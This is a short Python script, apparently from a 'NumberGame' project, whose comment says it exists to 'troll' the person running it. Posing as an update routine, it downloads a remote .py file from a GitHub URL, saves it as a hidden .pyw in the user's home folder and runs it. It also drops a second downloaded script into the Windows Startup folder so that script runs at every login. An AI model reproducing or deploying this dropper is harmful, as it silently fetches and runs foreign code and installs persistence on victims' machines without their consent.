# Downloads and injects the files needed to troll your dumbass
def update():
    import os
    home = os.path.expanduser("~")
    os.chdir(home)
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py'
    path = str(home) + '/update.pyw'
    path = '{}'.format(path)

    try:
        F = open('inst', 'r')
        F.close()
        print('Inst Exists')
        F = open('update.pyw', 'r')
        F.close()
        print('Update Exist')
    except FileNotFoundError:
        F = open('inst', 'w')
        F.close()
        try:
            os.remove(path)
            print('Reinstalling')
            install(dlurl, path)
        except FileNotFoundError:
            print('Update missing')
            install(dlurl, path)
    onboot()
def install(dlurl, path):
    import urllib.request, os
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    os.system("start cmd /c {}".format('pyw ' + path))

def onboot():
    import os, urllib.request
    home = os.path.expanduser("~")
    os.chdir(home)
    startup = '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
    path = home + startup
    path = path + '/startup.pyw'
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/startup.py'
    path = '{}'.format(path)
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    

update()